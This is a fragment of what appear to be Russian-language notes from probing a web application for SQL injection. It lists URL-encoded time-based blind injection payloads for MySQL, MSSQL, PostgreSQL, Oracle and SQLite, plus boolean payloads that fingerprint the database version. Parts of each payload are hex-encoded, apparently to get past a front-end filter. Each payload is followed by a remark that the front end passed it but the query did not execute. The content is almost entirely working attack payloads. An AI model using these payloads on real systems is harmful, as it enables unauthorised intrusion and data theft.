...
```sql
2%20%61%6e%64%20(%53%45%4c%45%43%54%20IF(1=1, SLEEP(10), %27a%27))=%27a%27%23    
```

фронт пропустил но не выполнился запрос  

```sql
2%3b%20%57%41%49%54%46%4f%52%20%44%45%4c%41%59%20%27%30%3a%30%3a%31%30%27%2d%2d     
```
пропустил но не выполнился запрос  

```sql
2%20%61%6e%64%20(%53%45%4c%45%43%54%20CASE%20WHEN%20(1=1)%20THEN%20pg_sleep(10)%20ELSE%20pg_sleep(0)%20END)%20IS%20NOT%20NULL%2d%2d        
```
пропустил но не выполнился запрос  
...
```sql
2%20%61%6e%64%20(%53%45%4c%45%43%54%20CASE%20WHEN%20(1=1)%20THEN%20%44%42%4d%53%5f%4c%4f%43%4b%2e%53%4c%45%45%50(10)%20ELSE%200%20END%20FROM%20dual)=0%2d%2d     
```  
пропустил но не выполнился запрос  

```sql
2%20%61%6e%64%20(%53%45%4c%45%43%54%20CASE%20WHEN%20(1=1)%20THEN%20LIKE(%27ABCDEFG%27,%20UPPER(HEX(RANDOMBLOB(100000000))))%20ELSE%200%20END)=1%2d%2d          
```
фронт пропустил но не выполнился запрос  
...
%27 %41%4e%44 SUBSTRING(@@version,1,1)=%275%27%2d%2d
```
...
%27 %41%4e%44 SUBSTRING(@@version,1,1)=%27M%27      
```
пропустил но не выполнился запрос  
...
%27 %41%4e%44 SUBSTRING(version(),1,1)=%27P%27%2d%2d 
```
пропустил но не выполнился запрос  
...
%27 %41%4e%44 SUBSTR((%53%45%4c%45%43%54 banner FROM v$version WHERE rownum=1),1,1)=%27O%27 FROM DUAL%2d%2d       
```
пропустил но не выполнился запрос  
...
%27 %41%4e%44 SUBSTR(sqlite_version(),1,1)=%273%27%2d%2d     
```
пропустил но не выполнился запрос  
